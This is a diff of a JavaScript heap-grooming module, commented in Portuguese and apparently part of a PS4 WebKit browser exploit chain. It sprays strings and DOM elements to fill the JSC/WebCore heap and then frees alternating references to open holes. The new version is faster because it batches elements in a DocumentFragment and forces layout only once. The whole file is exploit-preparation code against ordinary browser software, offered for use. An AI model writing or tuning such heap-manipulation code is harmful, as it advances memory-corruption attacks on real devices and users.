@@ -1,6 +1,6 @@
 /**
- * MOD_GROOMER.JS — Heap Manipulator (Versao 12.0 - DOM Nativo)
- * Atualizado: Alocacao completa de objetos C++ no WebCore e encoding limpo.
+ * MOD_GROOMER.JS — Heap Manipulator (Versao 13.0 - High Performance)
+ * Otimizado: Uso de DocumentFragment e Batch Layout para poupar CPU do PS4.
  */
 
 export const Groomer = {
@@ -9,14 +9,10 @@ export const Groomer = {
 
     sprayStrings: function(count, size = 1024) {
         let trash = new Array(count);
-        
-        // Evita a otimizacao de Rope Strings do JSC
         const baseStr = 'A'.repeat(size);
         for (let i = 0; i < count; i++) {
-            // Slice + concatenacao forca a criacao de um novo WTF::StringImpl na memoria C++
             trash[i] = (baseStr + i.toString()).slice(0, size);
         }
-        
         this.trashStrings.push(trash);
         return trash;
     },
@@ -24,39 +20,37 @@ export const Groomer = {
     sprayDOM: function(tag, count) {
         let trash = new Array(count);
         
-        // 🚨 FIX CRITICO: Elementos orfaos nao criam RenderObjects pesados.
-        // Precisamos anexa-los a um sandbox real no documento.
         let sandbox = document.getElementById('groomer-sandbox');
         if (!sandbox) {
             sandbox = document.createElement('div');
             sandbox.id = 'groomer-sandbox';
-            // Sandbox invisivel para nao quebrar a interface visual do seu painel
             sandbox.style.position = 'absolute';
             sandbox.style.top = '-9999px';
             sandbox.style.visibility = 'hidden';
             document.body.appendChild(sandbox);
         }
         
+        // 🚨 FIX DE PERFORMANCE: Usamos um fragmento para evitar milhares de reflows
+        let fragment = document.createDocumentFragment();
+        
         for (let i = 0; i < count; i++) {
             let el = document.createElement(tag);
-            
-            // Adicionar ID engorda o objeto no bmalloc
             el.id = `groom_${tag}_${i}`;
-            sandbox.appendChild(el); 
-            
-            // 🚨 FIX CRITICO: Forca o WebKit a desenhar o elemento AGORA.
-            // Isso obriga a alocacao imediata do RenderStyle e RenderTree na RAM.
-            void el.offsetWidth; 
-            
+            fragment.appendChild(el);
             trash[i] = el;
         }
+        
+        // Injetamos todos os elementos de uma vez só
+        sandbox.appendChild(fragment);
+        
+        // 🚨 FIX DE PERFORMANCE: Forçamos a alocação pesada no WebCore APENAS UMA VEZ
+        void sandbox.offsetWidth;
         
         this.trashDOM.push(trash);
         return trash;
     },
 
     punchHoles: function(array, step = 2) {
-        // Metodo Queijo Suico: Cria buracos na memoria libertando referencias
         for (let i = 0; i < array.length; i += step) {
             array[i] = null;
         }
@@ -68,8 +62,8 @@ export const Groomer = {
         
         let sandbox = document.getElementById('groomer-sandbox');
         if (sandbox) {
-            // Destroi a arvore do sandbox de uma vez para forcar o GC a varrer em bloco
-            try { sandbox.innerHTML = ''; } catch(e) {}
+            // Em vez de innerHTML = '', remover e recriar o nó é mais rápido no C++
+            sandbox.remove(); 
         }
     }
 };
